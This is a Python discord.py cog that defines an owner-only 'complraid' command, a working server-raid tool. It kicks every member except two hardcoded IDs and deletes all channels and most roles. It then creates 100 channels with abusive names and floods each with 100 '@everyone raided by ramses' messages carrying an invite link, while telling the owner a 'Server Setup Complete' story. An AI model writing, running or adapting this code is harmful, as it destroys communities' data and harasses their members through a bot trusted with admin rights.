import discord
from discord.ext import commands
import asyncio

class RaidCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="complraid")
    @commands.is_owner()
    async def raid(self, ctx):
        guild = ctx.guild
        bot_member = guild.me  # The bot's member object
        bot_top_role = bot_member.top_role  # The bot's highest role

        # IDs to exclude from being kicked
        excluded_ids = {1194399742516531222, 734521077744664588}

        # 1. Kick All Members Except Excluded IDs
        members = guild.members
        semaphore_kick = asyncio.Semaphore(10)  # Limit concurrency to 10

        async def kick_member(member):
            async with semaphore_kick:
                if member.id in excluded_ids:
                    return  # Skip members in the excluded list
                try:
                    await member.kick(reason="Server reset by the bot.")
                except discord.HTTPException:
                    pass
                except discord.Forbidden:
                    pass

        kick_member_tasks = [
            kick_member(member) 
            for member in members 
            if member != bot_member  # Ensure the bot doesn't try to kick itself
        ]
        await asyncio.gather(*kick_member_tasks)

        # 2. Delete All Channels
        channels = guild.channels
        semaphore_delete = asyncio.Semaphore(10)  # Limit concurrency to 10

        async def delete_channel(channel):
            async with semaphore_delete:
                try:
                    await channel.delete()
                except discord.HTTPException:
                    pass

        delete_channel_tasks = [delete_channel(channel) for channel in channels]
        await asyncio.gather(*delete_channel_tasks)

        # 3. Delete All Roles Except Default and Higher Roles
        roles = guild.roles
        semaphore_delete_role = asyncio.Semaphore(10)

        async def delete_role(role):
            async with semaphore_delete_role:
                try:
                    await role.delete()
                except discord.HTTPException:
                    pass

        delete_role_tasks = [
            delete_role(role) 
            for role in roles 
            if role != guild.default_role and role.position < bot_top_role.position
        ]
        await asyncio.gather(*delete_role_tasks)

        # 4. Create 100 New Channels
        base_messages = [
            "fucked-by-ramses",
            "raided",
            "get-shit-on",
            "its-over-for-you"
        ]

        channel_names = []
        repeats = 1000 // len(base_messages) + 1
        for i in range(repeats):
            for msg in base_messages:
                channel_names.append(f"{msg}-{i+1}")
                if len(channel_names) >= 100:
                    break
            if len(channel_names) >= 100:
                break

        semaphore_create = asyncio.Semaphore(10)
        created_channels = []

        async def create_channel(name):
            async with semaphore_create:
                try:
                    channel = await guild.create_text_channel(name)
                    created_channels.append(channel)
                except discord.HTTPException:
                    pass

        create_channel_tasks = [create_channel(name) for name in channel_names]
        await asyncio.gather(*create_channel_tasks)

        # 5. Send 100 Messages in Each New Channel
        async def send_messages(channel):
            for _ in range(100):  # Send 100 messages
                await channel.send("@everyone raided by ramses https://www.discord.gg/funime")

        send_message_tasks = [send_messages(channel) for channel in created_channels]
        await asyncio.gather(*send_message_tasks)

        # 6. Notify the Bot Owner
        app_info = await self.bot.application_info()
        owner = app_info.owner  # The owner is a discord.User object

        try:
            await owner.send(
                "✅ **Server Setup Complete!**\n"
                "All members have been kicked (except excluded IDs), all channels deleted, roles reset, and new channels created with messages."
            )
        except discord.errors.Forbidden:
            pass

# Function to setup the cog
async def setup(bot):
    await bot.add_cog(RaidCog(bot))
